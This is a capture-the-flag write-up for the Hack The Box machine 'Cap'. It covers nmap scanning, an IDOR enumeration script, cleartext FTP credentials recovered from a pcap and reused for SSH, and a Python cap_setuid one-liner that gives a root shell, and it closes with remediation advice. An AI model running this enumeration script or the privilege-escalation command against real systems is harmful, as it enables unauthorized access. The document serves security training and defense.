# HTB — Cap Writeup

- **Machine:** Cap
- **Platform:** Hack The Box
- **OS:** Linux (Ubuntu 20.04)
- **Difficulty:** Easy
- **Target IP:** `10.129.65.127`

---

## Summary

Cap is an easy Linux box that revolves around a web-based "Security Dashboard."
The dashboard lets you download network captures (`.pcap`), but it references
them by a sequential numeric ID in the URL. That sequential ID is an **IDOR**
(Insecure Direct Object Reference): by changing the number we can read captures
that belong to other sessions. One of those captures contains a **plaintext FTP
login** for the user `nathan`. Those same credentials work over SSH, giving us a
foothold and the user flag. Finally, `/usr/bin/python3.8` has the
`cap_setuid` Linux capability set, which lets any user set their UID to 0 — a
trivial privilege escalation to **root**.

**Attack path at a glance:**

```
nmap recon  →  web dashboard (IDOR on /data/<id>)  →  pcap with FTP creds
   →  SSH as nathan (user flag)  →  python3.8 cap_setuid capability  →  root
```

---

## 1. Reconnaissance

### 1.1 Full TCP port scan

First we scan all 65,535 TCP ports to see what is exposed, using a high packet
rate so it finishes quickly, and `-Pn` to skip host discovery (HTB filters ICMP).

```bash
nmap -p- --min-rate 1000 -T4 -Pn --open -oA scans/allports 10.129.65.127
```

Result:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Three open ports — FTP (21), SSH (22), and HTTP (80).

**Flag explanations**
- `-p-` — scan every port (1–65535), not just the default top-1000.
- `--min-rate 1000` — send at least 1000 packets/sec to keep it fast.
- `-T4` — aggressive timing template.
- `-Pn` — treat the host as up; don't waste time on ping probes.
- `--open` — only show ports that are actually open.
- `-oA scans/allports` — save output in all three formats (.nmap/.gnmap/.xml).

### 1.2 Service & version detection

Now we dig into just those three ports to fingerprint versions, run default
scripts, and detect the OS.

```bash
nmap -p 21,80,22 -sC -sV -O -Pn -oA scans/deep 10.129.65.127
```

Result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```

**What this tells us**
- **FTP** is `vsftpd 3.0.3` — no anonymous login advertised, and no known easy
  exploit. We'll need credentials.
- **SSH** is `OpenSSH 8.2p1` on Ubuntu Focal — modern and not directly
  exploitable. Also needs credentials.
- **HTTP** is served by **Gunicorn** (a Python WSGI server) and the page title
  is **"Security Dashboard."** A Python web app is the most interesting target,
  so we focus here.

**Flag explanations**
- `-sC` — run the default NSE script set.
- `-sV` — probe for service/version banners.
- `-O` — attempt OS detection.

## 2. Enumerating the web application

Browsing to `http://10.129.65.127/` shows a "Security Dashboard" — a Flask/Gunicorn
app that presents security tooling: a dashboard with fake stats, an **IP config**
page, a **network status** page, and a **Security Snapshot** feature that captures
live traffic and lets you download it as a `.pcap`.

The Security Snapshot is the key feature. When you request a capture, the app
redirects you to a results page at a URL shaped like:

```
http://10.129.65.127/data/<id>
```

where `<id>` is a number. The capture generated for *our* session is typically
served at a non-zero ID. The critical observation:

> The capture is referenced purely by a **sequential integer** with no
> authorization check tying that capture to the session that created it.

That is a textbook **IDOR**. If we can request `/data/0`, `/data/1`, … we may be
able to read captures belonging to other users — including ones generated by the
machine's own admin/user activity.

---

## 3. Exploiting the IDOR

### 3.1 Scripting the ID sweep

To find which IDs return a real capture instead of a redirect, we loop over a
range of IDs and record any response whose HTTP status is **not** `302`.

Normally, requesting a `/data/<id>` that doesn't belong to you just redirects
(`302`) back to the dashboard. An ID that returns `200` is a capture we can
actually read.

`IDOR_script.sh`:

```bash
for i in $(seq 0 10000); do
  code=$(curl -sS -o /tmp/body "http://10.129.65.127:80/data/$i" -w "%{http_code}")
  if [ "$code" != "302" ]; then
    echo "=========== $i with code $code ===========" >> IDOR_result.txt
    echo >> IDOR_result.txt
    echo "hit on $i"
  fi
done
```

**How it works**
- `seq 0 10000` — iterate IDs 0 through 10000.
- `curl -sS -o /tmp/body ... -w "%{http_code}"` — silently fetch each URL,
  dump the body to `/tmp/body`, and print only the HTTP status code.
- The `if` keeps any response that isn't a `302` redirect.
- Hits are appended to `IDOR_result.txt`.

### 3.2 Results

`IDOR_result.txt`:

```
=========== 0 with code 200 ===========
=========== 1 with code 200 ===========
=========== 2 with code 200 ===========
=========== 3 with code 200 ===========
```

The low IDs all return `200`. The most interesting one is **`/data/0`** — this
is the very first capture, which belongs to the admin/user who set the machine
up and therefore contains the most sensitive traffic.

### 3.3 Reading the captured credentials

Downloading the pcap from `http://10.129.65.127/data/0` and opening it (in
Wireshark, or by following the TCP stream) reveals a plaintext **FTP** session.
FTP sends credentials in cleartext, so the `USER` and `PASS` commands are
captured verbatim:

```
USER: nathan
PASS: Buck3tH4TF0RM3!
```

> **Why this works:** FTP has no transport encryption. Because the dashboard let
> us read a capture that wasn't ours (IDOR), and that capture happened to record
> a live FTP login, we recovered valid credentials for free.

In Wireshark you can reach this quickly with:
- **File → Open** the downloaded `.pcap`, then the display filter `ftp`, or
- Right-click an FTP packet → **Follow → TCP Stream**.

## 4. Foothold — user access

### 4.1 Verifying over FTP

The recovered credentials work on the FTP service, and nathan's home directory
contains the user flag:

```bash
ftp 10.129.65.127
# Name: nathan
# Password: Buck3tH4TF0RM3!
ftp> ls
ftp> get user.txt
```

`user.txt`:

```
3162b136eae15a08af69fd70565ac532
```

> **First flag — user.txt:** `3162b136eae15a08af69fd70565ac532`

### 4.2 Upgrading to an interactive SSH shell

Credential reuse is common, and nathan's FTP password is also his SSH password.
This gives us a proper interactive shell:

```bash
ssh nathan@10.129.65.127
# password: Buck3tH4TF0RM3!
```

We now have an interactive session as the `nathan` user.

## 5. Privilege escalation — root

### 5.1 Hunting for Linux capabilities

Rather than look only at SUID binaries, we check for **file capabilities**, which
are a finer-grained way of granting privileges to individual binaries and are a
frequent (and easily missed) privesc vector.

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

Result:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**What this means**
- `getcap` prints the capabilities attached to a file.
- `/usr/bin/python3.8` carries **`cap_setuid`**.
- `cap_setuid` lets the process call `setuid()` to **any UID, including 0 (root),
  bypassing the normal kernel permission checks** — no password needed.
- `+eip` means the capability is Effective, Inheritable, and Permitted.

### 5.2 Abusing CAP_SETUID (GTFOBins)

[GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) documents
exactly this case. Because Python can set its own UID to 0 and then spawn a
shell, we get a root shell:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

**Line-by-line**
- `os.setuid(0)` — set the effective UID to 0 (root); allowed because of
  `cap_setuid`.
- `os.execl("/bin/sh", "sh")` — replace the Python process with a shell, which
  now runs as root.

Confirm and grab the flag:

```bash
# id
uid=0(root) gid=1000(nathan) groups=1000(nathan)
# cat /root/root.txt
2fb636a87e9b38b43abca8a6d815e725
```

> **Final flag — root.txt:** `2fb636a87e9b38b43abca8a6d815e725`

## 7. Remediation

- **Fix the IDOR.** Enforce authorization on `/data/<id>`: a user should only be
  able to read captures they own. Use unguessable identifiers (UUIDs) *in
  addition to* server-side access checks — not as a substitute for them.
- **Stop using plaintext FTP.** Replace FTP with FTPS/SFTP so credentials are
  never sent in the clear and cannot be recovered from a capture.
- **Don't reuse credentials** across FTP and SSH, and avoid storing/transmitting
  reusable passwords where they can be captured.
- **Remove unnecessary capabilities.** `/usr/bin/python3.8` should never carry
  `cap_setuid`. Audit with `getcap -r / 2>/dev/null` and strip capabilities from
  general-purpose interpreters with `setcap -r /usr/bin/python3.8`.

---

## 8. Lessons learned

- Sequential IDs in URLs are a red flag — always test adjacent values for IDOR.
- Cleartext protocols (FTP, HTTP, Telnet) in a capture are a goldmine; FTP leaks
  credentials directly.
- Credential reuse turns one leaked password into access across multiple services.
- Privilege escalation isn't only SUID binaries — **Linux capabilities** are an
  equally important thing to enumerate (`getcap`), and GTFOBins covers how to
  abuse each one.
